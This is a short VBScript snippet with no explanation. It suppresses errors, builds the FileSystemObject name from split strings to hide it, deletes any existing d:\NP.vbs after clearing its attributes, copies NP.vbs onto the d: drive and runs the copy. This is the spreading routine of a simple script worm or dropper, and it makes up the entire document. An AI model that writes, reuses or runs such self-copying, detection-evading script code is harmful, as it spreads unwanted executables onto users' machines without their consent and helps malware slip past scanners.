on error resume next
set fso = CreateObject("Scripting.FileSys"&"temObject")
if fso.FileExists("NP.vbs") = -1 then
if fso.FileExists("d:\NP.vbs") = -1 then
set f = fso.getfile("d:\NP.vbs")
if f.attributes = 0 then
else
f.attributes = 0
end if
f.delete(true)
end if
fso.copyfile "NP.vbs", "d:\NP.vbs", true
set wshshell = wscript.createobject("WScript.Shell")
wshshell.run "d:\NP.vbs"
end if
